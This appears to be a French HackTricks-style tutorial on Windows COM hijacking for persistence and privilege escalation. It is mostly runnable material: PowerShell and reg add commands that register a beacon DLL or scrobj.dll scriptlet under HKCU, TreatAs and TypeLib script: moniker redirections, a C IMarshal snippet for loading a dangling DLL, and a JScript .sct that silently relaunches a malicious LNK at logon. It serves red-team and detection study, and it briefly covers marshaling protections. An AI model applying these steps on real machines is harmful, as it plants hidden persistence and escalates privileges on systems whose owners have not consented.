# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Recherche de composants COM inexistants

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, le **COM Hijacking** peut être utilisé comme **mécanisme de persistance**. Avec `procmon`, il est facile de repérer les clés de registre COM recherchées qui n’existent pas encore et qu’un attaquant pourrait créer. Filtres classiques :

- Opérations **RegOpenKey**.
- où le _Result_ est **NAME NOT FOUND**.
- et où le _Path_ se termine par **InprocServer32**.

Variantes utiles lors de la recherche :

- Recherchez également les clés **`LocalServer32`** manquantes. Certaines classes COM sont des serveurs hors processus et lanceront un EXE contrôlé par l’attaquant au lieu d’une DLL.
- Recherchez les opérations de registre **`TreatAs`** et **`ScriptletURL`** en plus de `InprocServer32`. Les règles de détection récentes et les analyses de malware les signalent régulièrement, car elles sont beaucoup plus rares que les inscriptions COM habituelles et constituent donc des indicateurs à forte valeur.
- Lors du clonage d’une inscription dans HKCU, copiez le **`ThreadingModel`** légitime depuis `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Un modèle incorrect compromet souvent l’activation et rend le hijack plus visible.<sup>[[3]](#references)</sup>
- Sur les systèmes 64 bits, inspectez les vues 64 bits et 32 bits (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` et `HKLM\Software\Classes\WOW6432Node`), car les applications 32 bits peuvent résoudre une inscription COM différente.

Une fois le COM inexistant à usurper choisi, exécutez les commandes suivantes. _Soyez prudent si vous décidez d’usurper un COM chargé toutes les quelques secondes, car cela pourrait être excessif._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Composants COM du Planificateur de tâches détournables

Les tâches Windows utilisent des déclencheurs personnalisés pour appeler des objets COM et, comme leur exécution passe par le Planificateur de tâches, il est plus facile de prévoir quand ils seront déclenchés.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

En examinant le résultat, vous pouvez par exemple en sélectionner une qui sera exécutée **à chaque connexion d’un utilisateur**.

En recherchant ensuite le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\CLASSES\ROOT\CLSID**, ainsi que dans HKLM et HKCU, vous constaterez généralement que la valeur n’existe pas dans HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Ensuite, vous pouvez simplement créer l’entrée HKCU et, chaque fois que l’utilisateur se connecte, votre backdoor sera exécutée.

## Inscriptions COM orphelines et marshaling personnalisé

Une inscription COM à l’échelle de la machine peut devenir un vecteur de DLL planting sans qu’il soit nécessaire de modifier le registre. Recherchez une valeur `InprocServer32` dont la DLL est absente et dont le chemin final peut être créé ou modifié par un utilisateur à faibles privilèges. En déposant une DLL portant exactement le même nom, vous faites en sorte que tout processus activant le CLSID charge le code de l’attaquant. Dans l’exemple CrossDevice, le chemin inscrit était `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` ; un utilisateur standard pouvait donc créer le sous-répertoire et la DLL manquants.<sup>[[5]](#references)</sup>

### Mappages de plug-ins modifiables comme chemins d’activation COM privilégiés

Un mappage modifiable entre les ID de plug-ins et les CLSID peut permettre à un utilisateur moins privilégié de choisir le serveur COM in-process qu’un service privilégié charge, même si l’inscription de la classe à l’échelle de la machine ne peut pas être modifiée.<sup>[[8]](#references)[[9]](#references)</sup> Dans le cas rapporté d’`InstallService` sous Windows 11, les utilisateurs standard pouvaient modifier `StaticPluginMap` ; un ID de plug-in non intégré sélectionnait un CLSID que le service `LocalSystem` transmettait à `CoCreateInstance` avec `CLSCTX_INPROC_SERVER` et `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> La DLL inscrite est chargée dans le processus du service, plutôt que dans un hôte COM distinct.<sup>[[10]](#references)</sup>

Les conditions pertinentes sont un accès en écriture effectif au mappage, une requête de plug-in accessible et un chemin de DLL `InprocServer32` contrôlable par l’utilisateur moins privilégié.<sup>[[8]](#references)[[9]](#references)</sup> Dans le cas rapporté, l’inscription CrossDevice ci-dessus fournissait la condition liée au chemin.<sup>[[8]](#references)[[9]](#references)</sup> Un objet de plug-in fonctionnel doit exposer l’interface demandée, mais la DLL est chargée avant la fin de `CoCreateInstance` ; le fait de ne pas exposer cette interface n’exclut donc pas, à lui seul, l’exécution de code pendant le chargement.<sup>[[8]](#references)[[11]](#references)</sup> Cette voie par dispatch de service diffère de la voie par `IMarshal` personnalisé décrite ci-dessous. Pour le primitive distincte utilisant un chemin de fichier, voir [DLL Hijacking](dll-hijacking/).

### `IMarshal` comme primitive de chargement de DLL interprocessus

COM représente normalement un pointeur d’interface par un `OBJREF` standard qui renvoie le récepteur à l’objet d’origine. Un objet qui implémente `IMarshal` peut produire à la place un `OBJREF` personnalisé. Sa méthode `GetUnmarshalClass` fournit le CLSID du code qui reconstruira l’objet dans le processus récepteur. Ce CLSID n’a pas besoin d’identifier l’objet d’origine. COM le résout comme un serveur in-process et charge la DLL inscrite avant de distribuer l’appel à la méthode de l’interface demandée.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Une implémentation malveillante minimale n’a qu’à remplacer le CLSID orphelin dans `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Transmettez cet objet via un paramètre de méthode proxifié, tel que `[in] IUnknown *`. Une autre option consiste à utiliser `CoGetInstanceFromIStorage`, l’objet avec marshaling personnalisé implémentant également suffisamment de `IStorage` pour satisfaire les vérifications locales. Le unmarshaling automatique dans le serveur distant résout le CLSID substitué ; le chargement de la DLL a donc lieu avant l’exécution de la méthode cible.<sup>[[5]](#references)</sup>

Cette primitive ne se limite pas aux enregistrements manquants. Elle peut également forcer le destinataire à charger une DLL de custom-unmarshaler existante et révéler des bugs dans son chemin de chargement ou de unmarshaling.<sup>[[5]](#references)</sup>

La chaîne nécessite toutes les conditions suivantes :<sup>[[5]](#references)</sup>

1. Un CLSID visible par la machine pointe vers une DLL in-process manquante ou remplaçable.
2. L’attaquant peut placer cette DLL au chemin résolu.
3. Un serveur COM out-of-process activable s’exécute au niveau de privilège souhaité.
4. Le serveur accepte le custom marshaling et expose un appel proxifié qui transmet l’objet de l’attaquant au-delà de la frontière entre processus.

### Find dangling in-process servers

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) et [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) peuvent énumérer la base de données COM de la machine et tester chaque serveur à l’aide de la résolution normale des modules Win32. Cette méthode est préférable à `Test-Path`, car certains enregistrements ne contiennent qu’un nom de fichier et s’appuient sur le chemin de recherche du chargeur.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Traitez le résultat comme une liste de candidats, et non comme une preuve d’exploitabilité. Résolvez le chemin comme le fait le loader, puis inspectez la DACL du premier parent existant et celle de la DLL visée si elle existe déjà. Un fichier manquant n’est utile que si l’attaquant peut créer ou remplacer le chemin que COM résoudra réellement.<sup>[[5]](#references)</sup>

### Sélectionner et démarrer un récepteur privilégié

Examinez les classes COM candidates pour repérer `RunAs`, l’association à un service, les interfaces disponibles et les proxies RPC. Une classe configurée pour `SYSTEM` mais non associée à un service nommé peut échouer lors de l’activation directe, car RPCSS ne peut pas la démarrer. Dans ce cas, recherchez un déclencheur non privilégié qui démarre son hôte, comme une tâche planifiée exécutable, et reproduisez tout prérequis lié à un événement nommé ou à IPC qui maintient le serveur actif.<sup>[[5]](#references)</sup>

Par exemple, la chaîne vulnérable Shell Create Object Handler démarrait son hôte en créant l’événement global attendu avant d’invoquer une tâche planifiée exécutable par l’utilisateur.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Reliez la référence d’objet obtenue à son hôte, puis vérifiez son identité et sa politique de marshaling. Ensuite, énumérez les interfaces et convertissez leurs proxies en IDL pour trouver un paramètre d’entrée, tel que `IUnknown *`, qui effectuera le marshaling du faux objet.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Protections contre le marshaling personnalisé

Un récepteur adapté ne doit pas rejeter les marshalers personnalisés non fiables. Deux protections à l’échelle du processus sont `EOAC_NO_CUSTOM_MARSHAL` dans les capacités transmises à `CoInitializeSecurity` et `COMGLB_UNMARSHALING_POLICY_STRONG` défini via `IGlobalOptions::Set`. Avec les symboles, l’état correspondant peut être inspecté dans `combase!gCapabilities` et `combase!g_GLBOPT_UnmarshalingPolicy` ; NtObjectManager expose le résultat sous le nom `CustomMarshalAllowed` lorsque son analyseur de processus prend en charge la build de Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permet d’émuler un CLSID par un autre.<sup>[[4]](#references)</sup> D’un point de vue offensif, cela signifie que vous pouvez laisser le CLSID d’origine intact, créer un second CLSID par utilisateur qui pointe vers `scrobj.dll`, puis rediriger le véritable objet COM vers l’objet malveillant avec `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Cette technique est utile lorsque :

- l’application cible instancie déjà un CLSID stable à l’ouverture de session ou au démarrage de l’application
- vous souhaitez effectuer une redirection dans le registre plutôt que remplacer l’`InprocServer32` d’origine
- vous souhaitez exécuter un scriptlet `.sct` local ou distant via la valeur `ScriptletURL`

Exemple de procédure (adaptée des techniques publiques d’Atomic Red Team et de recherches plus anciennes sur l’abus du registre COM) :

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes :

- `scrobj.dll` lit la valeur `ScriptletURL` et exécute le fichier `.sct` référencé. Vous pouvez donc conserver le payload dans un fichier local ou le récupérer à distance via HTTP/HTTPS.
- `TreatAs` est particulièrement pratique lorsque l’inscription COM d’origine est complète et stable dans HKLM, car il suffit alors d’une petite redirection par utilisateur au lieu de reproduire toute l’arborescence.
- Pour valider le fonctionnement sans attendre le déclencheur naturel, vous pouvez instancier manuellement le faux ProgID/CLSID avec `rundll32.exe -sta <ProgID-or-CLSID>` si la classe cible prend en charge l’activation STA.

## COM TypeLib Hijacking (script: moniker persistence)

Les bibliothèques de types (TypeLib) définissent les interfaces COM et sont chargées via `LoadTypeLib()`. Lorsqu’un serveur COM est instancié, le système d’exploitation peut également charger la TypeLib associée en consultant les clés de registre sous `HKCR\TypeLib\{LIBID}`. Si le chemin de la TypeLib est remplacé par un **moniker**, par exemple `script:C:\...\evil.sct`, Windows exécutera le scriptlet lors de la résolution de la TypeLib, ce qui crée une persistance discrète qui se déclenche lorsque des composants courants sont utilisés.

Ce comportement a été observé avec le contrôle Microsoft Web Browser (fréquemment chargé par Internet Explorer, les applications intégrant WebBrowser et même `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Étapes (PowerShell)

1) Identifiez la TypeLib (LIBID) utilisée par un CLSID fréquemment sollicité. Exemple de CLSID souvent exploité dans des chaînes de malware : `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Pointer le chemin TypeLib par utilisateur vers un scriptlet local à l’aide du moniker `script:` (aucun droit administrateur requis) :

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Déposez un fichier JScript `.sct` minimal qui relance votre payload principal (p. ex. un `.lnk` utilisé par la chaîne initiale) :

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Déclenchement – l’ouverture d’IE, d’une application qui intègre le contrôle WebBrowser, ou même une activité courante dans Explorer chargera la TypeLib et exécutera le scriptlet, réarmant ainsi votre chaîne à la connexion/au redémarrage.

Nettoyage
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- Vous pouvez appliquer la même logique à d’autres composants COM fréquemment utilisés ; résolvez toujours d’abord le véritable `LIBID` à partir de `HKCR\CLSID\{CLSID}\TypeLib`.
- Sur les systèmes 64 bits, vous pouvez également renseigner la sous-clé `win64` pour les consommateurs 64 bits.

## References

- [1] [Détourner la TypeLib – Nouvelle technique de persistance COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant des entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Retour sur le détournement COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Clé CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Techniques d’exploitation de Windows : enregistrements d’objets COM orphelins](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Interface IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - OBJREF MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC Dark Elevator et analyse technique (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator : élévation de privilèges locale via le service d’installation de Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Énumération CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Fonction CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

